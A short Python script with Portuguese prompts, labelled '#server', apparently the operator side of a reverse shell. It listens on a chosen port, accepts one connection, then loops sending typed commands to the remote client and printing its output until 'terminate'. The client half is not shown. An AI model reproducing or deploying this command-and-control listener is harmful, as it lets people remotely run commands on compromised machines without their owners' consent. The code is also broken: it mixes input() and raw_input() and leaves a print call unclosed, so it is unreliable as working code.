#server
#!/usr/bin/python
#-*-coding:utf-8-*-

import socket
import os

host = input("Insira o host do servidor: ")
port = int(input("Insira o numero da porta: "))

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Got a connection from: ", addr)
    hostname = conn.recv(1024)

    while True:
        command = raw_input((str(addr[0]) + "@" + str(hostname) + "> "))
        if("terminate" in command):
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command)
            print(conn.recv(2048)
def main():
    connect()
main()
